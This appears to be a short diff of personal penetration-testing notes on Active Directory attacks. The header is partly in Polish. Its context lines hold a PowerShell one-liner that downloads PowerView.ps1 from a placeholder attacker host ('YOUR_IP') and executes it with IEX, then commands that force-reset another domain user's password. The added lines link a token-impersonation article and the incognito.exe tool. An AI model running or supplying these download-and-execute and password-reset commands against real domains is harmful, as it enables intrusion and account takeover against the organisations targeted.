@@ -9,3 +9,6 @@ powerview.ps1 -> zmiana hasla innego usera + wiele innych
 (New-Object System.Net.WebClient).DownloadString('http://YOUR_IP/PowerView.ps1') | IEX
 $pass = ConvertTo-SecureString 'SuperSecuredPassword123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity Jacob.Greeny -AccountPassword $pass
+
+https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f
+https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
